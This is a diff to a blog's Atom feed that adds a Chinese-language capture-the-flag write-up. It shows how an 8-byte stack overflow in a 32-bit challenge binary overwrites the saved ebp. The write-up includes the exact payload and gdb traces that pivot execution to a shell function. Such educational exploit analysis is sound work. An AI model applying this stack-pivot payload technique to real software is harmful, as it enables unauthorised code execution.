@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://czh11.github.io</id>
     <title>Nono</title>
-    <updated>2020-12-11T12:25:34.887Z</updated>
+    <updated>2020-12-16T03:34:46.027Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://czh11.github.io"/>
     <link rel="self" href="https://czh11.github.io/atom.xml"/>
@@ -10,6 +10,119 @@
     <logo>https://czh11.github.io/images/avatar.png</logo>
     <icon>https://czh11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2020, Nono</rights>
+    <entry>
+        <title type="html"><![CDATA[通过修改ebp改变程序的走向]]></title>
+        <id>https://czh11.github.io/post/tong-guo-xiu-gai-ebp-gai-bian-cheng-xu-de-zou-xiang/</id>
+        <link href="https://czh11.github.io/post/tong-guo-xiu-gai-ebp-gai-bian-cheng-xu-de-zou-xiang/">
+        </link>
+        <updated>2020-12-16T03:29:49.000Z</updated>
+        <content type="html"><![CDATA[<p>查看保护</p>
+<pre><code>giantbranch@ubuntu:~/Desktop$ checksec format2
+[*] '/home/giantbranch/Desktop/format2'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>用ida打开</p>
+<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp+18h] [ebp-28h]
+  char s; // [esp+1Eh] [ebp-22h]
+  unsigned int v6; // [esp+3Ch] [ebp-4h]
+
+  memset(&amp;s, 0, 0x1Eu);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stdin, 0, 1, 0);
+  printf(&quot;Authenticate : &quot;);
+  _isoc99_scanf(&quot;%30s&quot;, &amp;s);
+  memset(&amp;input, 0, 0xCu);
+  v4 = 0;
+  v6 = Base64Decode((int)&amp;s, &amp;v4);
+  if ( v6 &gt; 0xC )
+  {
+    puts(&quot;Wrong Length&quot;);
+  }
+  else
+  {
+    memcpy(&amp;input, v4, v6);
+    if ( auth(v6) == 1 )
+      correct();
+  }
+  return 0;
+}
+</code></pre>
+<p>Base64Decode((int)&amp;s, &amp;v4)对输入的数进行了解密，同时把长度赋给v6，这里对v6进行了限制，输入的数据不能超过12个，进入auth（）函数中查看</p>
+<pre><code>_BOOL4 __cdecl auth(int a1)
+{
+  char v2; // [esp+14h] [ebp-14h]
+  char *s2; // [esp+1Ch] [ebp-Ch]
+  int v4; // [esp+20h] [ebp-8h]
+
+  memcpy(&amp;v4, &amp;input, a1);
+  s2 = (char *)calc_md5((int)&amp;v2, 12);
+  printf(&quot;hash : %s\n&quot;, s2);
+  return strcmp(&quot;f87cd601aa7fedca99018a8be88eda34&quot;, s2) == 0;
+}
+</code></pre>
+<p>发现v4最多8个字节，而输入最多12个，刚好可以覆盖ebp，在函数执行完后一般会执行</p>
+<pre><code>leave
+retn
+</code></pre>
+<p>这相当于</p>
+<pre><code>mov esp,ebp#将ebp的值赋给esp
+pop ebp#将栈中存储的上一个栈的ebp赋给ebp
+retn#call [rsp+4]
+</code></pre>
+<p>这时让input=‘aaaa'+p32(0x8049284)+p32(0x811eb40)</p>
+<pre><code>gdb-peda$ x/4gx 0x0811EB40
+0x811eb40 &lt;input&gt;:	0x0804928461616161	0x000000000811eb40
+0x811eb50 &lt;OPENSSL_ia32cap_P&gt;:	0xfffa32034f8bffff	0x0000000000000000
+</code></pre>
+<p>这时栈中的情况：</p>
+<pre><code>0032| 0xffb034a0 (&quot;aaaa\204\222\004\b@\353\021\b\a\224\004&quot;...)
+0036| 0xffb034a4 --&gt; 0x8049284 (&lt;correct+37&gt;:	mov    DWORD PTR [esp],0x80da66f)#ebp
+0040| 0xffb034a8 --&gt; 0x811eb40 (&quot;aaaa\204\222\004\b@\353\021\b&quot;)
+</code></pre>
+<p>可以发现ebp处的值覆盖为input的地址</p>
+<p>各寄存器的情况</p>
+<pre><code>EAX  0x0
+ EBX  0x80481d0 (_init) ◂— push   ebx
+ ECX  0x61
+ EDX  0x80da684 ◂— cmp    byte ptr [edi], dh
+ EDI  0x811b00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80a6470 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
+ ESI  0x0
+ EBP  0xffb034a8 —▸ 0x811eb40 (input) ◂— 0x61616161 ('aaaa')
+ ESP  0xffb03480 —▸ 0x80da684 ◂— cmp    byte ptr [edi], dh
+ EIP  0x804930b (auth+111) ◂— leave  
+</code></pre>
+<p>再auth（）函数结束只会进行如下操作</p>
+<pre><code>mov esp,ebp#0xffb034a8存储再esp中
+pop ebp #将0x811eb40赋给ebp
+retn #call [esp+4],及call[0xffb034ac]
+</code></pre>
+<pre><code>EBP  0x811eb40 (input) ◂— 0x61616161 ('aaaa')
+ESP  0xffb034ac —▸ 0x8049407 (main+250) ◂— cmp    eax, 1
+</code></pre>
+<p>这时进入主函数中，这时个寄存器的状况</p>
+<pre><code>EAX  0x0
+ EBX  0x80481d0 (_init) ◂— push   ebx
+ ECX  0x61
+ EDX  0x80da684 ◂— cmp    byte ptr [edi], dh
+ EDI  0x811b00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x80a6470 (__stpcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
+ ESI  0x0
+ EBP  0x811eb40 (input) ◂— 0x61616161 ('aaaa')
+ ESP  0xffb034b0 ◂— 0xc /* '\x0c' */
+ EIP  0x8049424 (main+279) ◂— leave  
+</code></pre>
+<p>这时进行</p>
+<pre><code>mov esp,ebp #esp=0x811eb40
+pop ebp #ebp=0x61616161
+retn #call[0x811eb40+4],而0x811eb44刚好存储着getshell的地址
+</code></pre>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Fastbin Attack]]></title>
         <id>https://czh11.github.io/post/fastbin-attack/</id>
